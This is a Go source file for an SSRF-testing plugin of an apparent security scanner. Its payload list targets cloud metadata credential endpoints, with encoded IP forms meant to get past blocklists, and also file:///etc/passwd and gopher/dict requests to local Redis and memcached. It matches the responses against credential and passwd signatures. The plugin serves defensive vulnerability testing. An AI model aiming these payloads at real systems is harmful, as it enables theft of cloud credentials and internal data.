package plugins

import (
	"strings"

	"agentdast/internal/core"
	"agentdast/pkg/types"
)

// SSRFPlugin tests URL-like parameters for Server-Side Request Forgery by
// pointing them at cloud metadata and local files, then confirming the server
// actually fetched the resource (as opposed to merely echoing the URL back).
type SSRFPlugin struct{}

func (p *SSRFPlugin) Name() string             { return "ssrf" }
func (p *SSRFPlugin) Category() string         { return "injection" }
func (p *SSRFPlugin) Severity() types.Severity { return types.SeverityCritical }
func (p *SSRFPlugin) Description() string {
	return "Tests URL-like parameters for SSRF by fetching cloud metadata / local files and confirming the content was returned"
}

func (p *SSRFPlugin) DefaultPayloads() []string {
	return []string{
		// AWS instance metadata (IMDSv1)
		"http://169.254.169.254/latest/meta-data/",
		"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
		// alternate encodings of 169.254.169.254 to bypass naive blocklists
		"http://2852039166/latest/meta-data/",               // decimal
		"http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/",      // hex octets
		"http://[::ffff:169.254.169.254]/latest/meta-data/", // IPv6-mapped
		// GCP metadata
		"http://metadata.google.internal/computeMetadata/v1/",
		// loopback / internal
		"http://127.0.0.1/",
		"http://localhost/",
		// non-HTTP schemes
		"file:///etc/passwd",
		"gopher://127.0.0.1:6379/_INFO%0d%0a",
		"dict://127.0.0.1:11211/stats",
	}
}

// urlParamHints identify parameters likely to take a URL.
var urlParamHints = []string{"url", "uri", "link", "callback", "webhook", "dest", "target", "redirect", "next", "feed", "image", "img", "avatar", "proxy", "fetch", "load", "site", "host", "domain"}

// ssrfResponseSignatures appear in the BODY returned by the targeted internal
// resource. They are deliberately chosen NOT to appear in the payload URLs, so
// that a server merely reflecting the URL cannot match them. (After payload
// stripping in matchSignal, reflected URLs are removed anyway.)
var ssrfResponseSignatures = []string{
	"ami-id",
	"instance-id",
	"instance-type",
	"local-hostname",
	"public-keys",
	"reservation-id",
	"security-groups",
	"iam/security-credentials",
	"accesskeyid",
	"root:x:0:0:",
	"daemon:x:",
}

func looksLikeURLParam(name string) bool {
	n := strings.ToLower(name)
	for _, h := range urlParamHints {
		if n == h || strings.Contains(n, h) {
			return true
		}
	}
	return false
}

func (p *SSRFPlugin) Test(ctx *core.ScanContext) []types.Finding {
	var findings []types.Finding
	for _, param := range ctx.Params() {
		if !looksLikeURLParam(param.Name) {
			continue
		}
		for _, payload := range p.DefaultPayloads() {
			if ctx.Ctx.Err() != nil {
				return findings
			}
			log := ctx.Inject(param, payload)
			if log.Error != "" {
				continue
			}
			// matchSignal strips the reflected payload first, so an endpoint that
			// simply echoes the URL back will NOT be flagged.
			sig, ok := matchSignal(log.ResponseBody, payload, ssrfResponseSignatures)
			if !ok {
				continue
			}
			findings = append(findings, types.Finding{
				Title:       "Server-Side Request Forgery in parameter " + param.Name,
				Endpoint:    ctx.Endpoint.Path,
				Method:      ctx.Endpoint.Method,
				ParamName:   param.Name,
				ParamIn:     param.In,
				Payload:     payload,
				Evidence:    "internal resource content returned (signature: " + sig + ", not from reflected input)\n" + evidence(log),
				Confidence:  types.ConfidenceConfirmed,
				Description: "A URL parameter caused the server to fetch an internal resource and return its content, confirming SSRF.",
				Remediation: "Validate and allow-list outbound URLs; block link-local/loopback/private ranges; disable unused URL schemes (file, gopher).",
				RequestLog:  logForMode(ctx, log),
			})
			break
		}
	}
	return findings
}
